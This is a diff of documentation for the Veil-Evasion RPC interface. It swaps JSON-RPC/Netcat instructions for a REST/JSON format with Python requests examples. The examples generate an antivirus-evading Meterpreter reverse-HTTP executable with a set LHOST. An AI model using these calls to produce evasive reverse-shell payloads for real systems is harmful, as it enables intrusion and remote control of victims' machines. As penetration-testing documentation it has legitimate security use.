@@ -67,42 +67,37 @@ On the listener side, run:
 
 This will start a listener on port 4242.
 
-On the client side, you will need to run a client program. This can be a custom script or can be as simple as Netcat. The RPC server implements JSON-RPC. This is a good reference for interpreting requests and responses for JSON-RPC: http://json-rpc.org/wiki/specification
-
-The RPC request format is as follows:
+REST API is entirely JSON based, both requests and respoonses. The following is the format:
 
 ```
-    method="version"            -   return the current Veil-Evasion version number
-    method="payloads"           -   return all the currently loaded payloads
-    method="payload_options"
-        params="payload_name"   -   return the options for the specified payload
-    method="generate"
-        params=["payload=X",   
-                "outputbase=Y"
-                "overwrite=Z",
-                "msfvenom=...",
-                "LHOST=blah]     -   generate the specified payload with the given options and returns the path of the generated executable
+    version:
+        request => {'action': 'version'}
+        response <= {'version': <version info>}
+
+    module options:
+        request => {'action': 'options', 'name': '<module name>'}
+        response <= {<Dict: <option key> => <optiion value>}
+
+    generate:
+        requests => {'action': 'generate', 'payload': {Dict: <option key> => <option value}}
+        response <= {'path': '<path to binar>'}
+
+    if there is an error processing the request, the response will be:
+        {'error': '<some error message>'}
 ```
 
-This is a simple example of working with Veil-Evasion using Netcat:
-
-
-```
-root@kali:~# nc 127.0.0.1 4242
-{"method":"version","params":[],"id":0}
-```
-
-And the server response:
-
+This is a simple example of working with Veil-Evasion using Python and python-requests.
 
 ```
-{"id":0,"result":"2.21.4","error":null}
+In [34]: import json
 
+In [35]: import requests
+
+In [36]: requests.post('http://127.0.0.1:4242/', data=json.dumps({'action': 'generate', 'options': {'payload': 'c/meterpreter/rev_http', 'LHOST': '192.168.2.236', 'outputbase': 'hello'}})).content
+Out[36]: '{"path": "/usr/share/veil-output/compiled/hello.exe"}'
+
+In [37]: requests.post('http://127.0.0.1:4242/', data=json.dumps({'action': 'options', 'name': 'c/meterpreter/rev_http'})).contentOut[37]: '{"LPORT": ["8080", "Port of the Metasploit handler"], "COMPILE_TO_EXE": ["Y", "Compile to an executable"], "LHOST": ["192.168.2.236", ""]}'
 ```
-
-An example of a client program can be found here: http://github.com/miligulmohar/python-symmetric-jsonrpc/blob/master/examples/client.py
-
-Note: The port for Veil-Evasion is 4242. This must be changed in client.py in order to work with it.
 
 In order to generate a payload, *ALL* parameters must be included:
 
@@ -113,22 +108,3 @@ In order to generate a payload, *ALL* parameters must be included:
 * pwnstaller - True to package python programs into an executable. False if not. Ignored for other payloads
 
 This is a good reference to understand whether or not in use pwnstaller: http://www.verisgroup.com/blog/2014/05/07/pwnstaller-and-the-veil-framework/
-
-An example of generating a payload:
-
-```
-root@kali:~# nc 127.0.0.1 4242
-{"method":"generate","params":["payload=c/meterpreter/rev_http","outputbase=payloadName","LHOST=192.168.1.11","LPORT=2121","pwnstaller=False"],"id":1"}
-```
-
-And the server response:
-
-```
-{"id":8,"result":"/usr/share/veil-output/compiled/payloadName.exe","error":null}
-```
-
-Note: If there is no id specified in the request, Veil-Evasion will shut down. That being said, you can make as many valid requests as you would like until Veil-Evasion shuts down.
-
-To shut down the RPC server run:
-
-`./Veil-Evasion --rpcshutdown`
